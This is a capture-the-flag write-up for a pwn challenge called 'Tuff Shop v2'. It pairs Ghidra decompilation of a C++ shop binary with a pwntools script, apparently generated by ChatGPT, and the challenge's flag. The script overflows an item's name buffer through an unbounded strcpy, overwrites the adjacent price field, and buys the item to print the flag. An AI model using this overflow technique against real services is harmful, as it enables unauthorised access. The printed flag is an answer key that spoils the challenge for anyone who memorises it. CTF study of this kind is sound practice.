# Tuff Shop v2

## Description

Oh my god! You just haxxed the reallly tuff shop again! But this time you got in their secret admin system... Can you pull off the best six seven prank in this secret build?

## Solution

So i used ghidra to deassemble the binary and got following code:

```c
 undefined8 main(void) 

 { 
   time_t tVar1; 
   long in_FS_OFFSET; 
   int local_14; 
   long local_10; 
    
   local_10 = *(long *)(in_FS_OFFSET + 0x28); 
   setbuf(stdin,(char *)0x0); 
   setbuf(stdout,(char *)0x0); 
   setbuf(stderr,(char *)0x0); 
   tVar1 = time((time_t *)0x0); 
   srand((uint)tVar1); 
   do { 
     menu(aura); 
     std::istream::operator>>((istream *)std::cin,&local_14); 
     switch(local_14) { 
     case 0: 
       std::operator<<((ostream *)std::cout,"Exiting...\n"); 
       cleanup(); 
       if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { 
         return 0; 
       } 
                     /* WARNING: Subroutine does not return */ 
       __stack_chk_fail(); 
     case 1: 
       add(); 
       break; 
     case 2: 
       edit(); 
       break; 
     case 3: 
       view(); 
       break; 
     case 4: 
       testBuy(); 
       break; 
     default: 
       std::operator<<((ostream *)std::cout,"Invalid choice\n"); 
     } 
   } while( true ); 
 } 

 /* testBuy() */ 

 void testBuy(void) 

 { 
   long in_FS_OFFSET; 
   int local_14; 
   long local_10; 
    
   local_10 = *(long *)(in_FS_OFFSET + 0x28); 
   std::operator<<((ostream *)std::cout,"Enter item index to buy: "); 
   std::istream::operator>>((istream *)std::cin,&local_14); 
   if (((local_14 < 0) || (9 < local_14)) || (*(long *)(items + (long)local_14 * 8) == 0)) { 
     puts("Invalid item index"); 
   } 
   else { 
     Item::buyItem(*(Item **)(items + (long)local_14 * 8)); 
   } 
   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { 
                     /* WARNING: Subroutine does not return */ 
     __stack_chk_fail(); 
   } 
   return; 
 } 

 /* view() */ 

 void view(void) 

 { 
   long in_FS_OFFSET; 
   int local_14; 
   long local_10; 
    
   local_10 = *(long *)(in_FS_OFFSET + 0x28); 
   std::operator<<((ostream *)std::cout,"Enter item index to view: "); 
   std::istream::operator>>((istream *)std::cin,&local_14); 
   if (((local_14 < 0) || (9 < local_14)) || (*(long *)(items + (long)local_14 * 8) == 0)) { 
     puts("Invalid item index"); 
   } 
   else { 
     Item::viewItem(*(Item **)(items + (long)local_14 * 8)); 
   } 
   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { 
                     /* WARNING: Subroutine does not return */ 
     __stack_chk_fail(); 
   } 
   return; 
 } 

 void edit(void) 

 { 
   long in_FS_OFFSET; 
   int local_14; 
   long local_10; 
    
   local_10 = *(long *)(in_FS_OFFSET + 0x28); 
   std::operator<<((ostream *)std::cout,"Enter item index to edit: "); 
   std::istream::operator>>((istream *)std::cin,&local_14); 
   if (((local_14 < 0) || (9 < local_14)) || (*(long *)(items + (long)local_14 * 8) == 0)) { 
     puts("Invalid item index"); 
   } 
   else { 
     Item::editName(*(Item **)(items + (long)local_14 * 8)); 
   } 
   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { 
                     /* WARNING: Subroutine does not return */ 
     __stack_chk_fail(); 
   } 
   return; 
 } 

 /* add() */ 

 void add(void) 

 { 
   int iVar1; 
   ostream *poVar2; 
   Item *this; 
   long in_FS_OFFSET; 
   int local_70; 
   char local_68 [63]; 
   undefined1 local_29; 
   long local_20; 
    
   local_20 = *(long *)(in_FS_OFFSET + 0x28); 
   local_70 = 0; 
   while ((local_70 < 10 && (*(long *)(items + (long)local_70 * 8) != 0))) { 
     local_70 = local_70 + 1; 
   } 
   if (local_70 == 10) { 
     puts("Inventory full"); 
   } 
   else { 
     std::operator<<((ostream *)std::cout,"Enter item name: "); 
     std::operator>>((istream *)std::cin,local_68); 
     local_29 = 0; 
     iVar1 = rand(); 
     iVar1 = iVar1 % 100 + 100; 
     poVar2 = std::operator<<((ostream *)std::cout,"Randomizing price to: "); 
     poVar2 = (ostream *)std::ostream::operator<<(poVar2,iVar1); 
     std::ostream::operator<<(poVar2,std::endl<>); 
     this = (Item *)operator.new(0x44); 
     Item::Item(this,local_68,iVar1); 
     *(Item **)(items + (long)local_70 * 8) = this; 
   } 
   if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) { 
                     /* WARNING: Subroutine does not return */ 
     __stack_chk_fail(); 
   } 
   return; 
 } 

 /* flag() */ 

 void flag(void) 

 { 
   FILE *__stream; 
   ostream *this; 
   long in_FS_OFFSET; 
   char local_58 [72]; 
   long local_10; 
    
   local_10 = *(long *)(in_FS_OFFSET + 0x28); 
   __stream = fopen("flag.txt","r"); 
   if (__stream == (FILE *)0x0) { 
     std::operator<<((ostream *)std::cout,"Error opening flag file\n"); 
   } 
   else { 
     fgets(local_58,0x40,__stream); 
     fclose(__stream); 
     this = std::operator<<((ostream *)std::cout,local_58); 
     std::ostream::operator<<(this,std::endl<>); 
   } 
   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { 
                     /* WARNING: Subroutine does not return */ 
     __stack_chk_fail(); 
   } 
   return; 
 } 

 void __thiscall std::ostream::operator<<(ostream *this,int param_1) 

 { 
   operator<<(this,param_1); 
   return; 
 } 

 /* Item::Item(char const*, int) */ 

 void __thiscall Item::Item(Item *this,char *param_1,undefined4 param_2) 

 { 
   strcpy((char *)this,param_1); 
   *(undefined4 *)(this + 0x40) = param_2; 
   return; 
 } 

 /* Item::editName() */ 

 void __thiscall Item::editName(Item *this) 

 { 
   long in_FS_OFFSET; 
   char local_58 [72]; 
   long local_10; 
    
   local_10 = *(long *)(in_FS_OFFSET + 0x28); 
   std::operator<<((ostream *)std::cout,"Enter new item name: "); 
   std::operator>>((istream *)std::cin,local_58); 
   strcpy((char *)this,local_58); 
   if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { 
                     /* WARNING: Subroutine does not return */ 
     __stack_chk_fail(); 
   } 
   return; 
 } 

 /* Item::buyItem() */ 

 void __thiscall Item::buyItem(Item *this) 

 { 
   ostream *this_00; 
    
   if (aura < *(int *)(this + 0x40)) { 
     std::operator<<((ostream *)std::cout,"Not enough aura to buy this item.\n"); 
   } 
   else { 
     aura = aura - *(int *)(this + 0x40); 
     this_00 = std::operator<<((ostream *)std::cout,"[Debug] reading flag"); 
     std::ostream::operator<<(this_00,std::endl<>); 
     flag(); 
   } 
   return; 
 } 

 /* WARNING: Unknown calling convention: __cdecl -- yet parameter storage is locked */ 
 /* std::istream& std::TEMPNAMEPLACEHOLDERVALUE(std::istream&, char*) */ 

 istream * __cdecl std::operator>>(istream *param_1,char *param_2) 

 { 
   std::__istream_extract(param_1,param_2,0x7fffffffffffffff); 
   return param_1; 
 }
```

So from this code i gave my best friend ChatGPT the code and it gave me the following python script to get the flag:

```python
#!/usr/bin/env python3
from pwn import *

HOST = "intersec.hcs-team.com"
PORT = 10216

# connect
io = remote(HOST, PORT)

def send_choice(choice):
    io.recvuntil(b"> ")        # or the program menu prompt; adjust if different
    io.sendline(str(choice).encode())

# 1) add an item (menu choice 1)
send_choice(1)
io.recvuntil(b"Enter item name: ")
# give any small name for initial creation
io.sendline(b"init_item")

# 2) edit that item (menu choice 2)
send_choice(2)
io.recvuntil(b"Enter item index to edit: ")
io.sendline(b"0")            # index 0 (adjust if needed)

io.recvuntil(b"Enter new item name: ")

# build payload:
# - pad to name buffer length (0x40 == 64)
# - then write the 4-byte little-endian price (e.g. 1)
# choose a new_price that is <= aura. Common choices: 1 or 0x01010101, etc.
new_price = 1
payload = b"A" * 64 + p32(new_price) + b"\n"

io.send(payload)

# 3) trigger buy (menu choice 4)
send_choice(4)
io.recvuntil(b"Enter item index to buy: ")
io.sendline(b"0")

# read output (should include [Debug] reading flag and the flag contents)
data = io.recvall(timeout=2)  # or use recvuntil if interactive
print(data.decode(errors='ignore'))

```

This is the flag: `HCS{omg_h343p_g00att_s0_tUFFFF_<3_7b5bd2cb-abe1-4bb8-bf38-2fc1420bf014}`